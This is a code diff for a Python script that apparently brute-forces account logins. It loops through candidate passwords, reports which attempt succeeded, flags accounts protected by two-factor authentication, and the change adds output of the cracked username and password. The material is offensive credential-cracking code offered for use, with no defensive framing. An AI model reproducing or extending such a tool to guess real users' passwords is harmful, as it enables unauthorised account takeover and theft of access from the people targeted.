@@ -112,10 +112,14 @@ if have_pl == "y" or have_pl == "yes":
     get_res = login(username,pas)
     if get_res:
       print(f"{wi}[{gr}+{wi}]{gr} Trying Login {wi}[{yl} {pas} {wi}] ==> {gr} Successful")
+      print(f"{wi}Username = {gr}{username}")
+      print(f"{wi}password = {gr}{pas}")
       break
       sys.exit()
     elif get_res == 2:
       print(f"{wi}[{gr}+{wi}]{gr} Trying Login {wi}[{yl}{pas}{wi}] {gr} ==> {wi} Successful")
+      print(f"{wi}Username = {gr}{username}")
+      print(f"{wi}password = {gr}{pas}")
       print(f"{rd}warning {wi}this account use 2F Authentication")
       break
       sys.exit()
@@ -135,10 +139,14 @@ else:
     get_res = login(username,str(pas))
     if get_res:
       print(f"{wi}[{gr}+{wi}]{gr} Trying Login {wi}[{yl} {pas} {wi}] ==> {gr} Successful")
+      print(f"{wi}Username = {gr}{username}")
+      print(f"{wi}password = {gr}{pas}")
       break
       sys.exit()
     elif get_res == 2:
       print(f"{wi}[{gr}+{wi}]{gr} Trying Login {wi}[{yl}{pas}{wi}] {gr} ==> {wi} Successful")
+      print(f"{wi}Username = {gr}{username}")
+      print(f"{wi}password = {gr}{pas}")
       print(f"{rd}warning {wi}this account use 2F Authentication")
       break
       sys.exit()
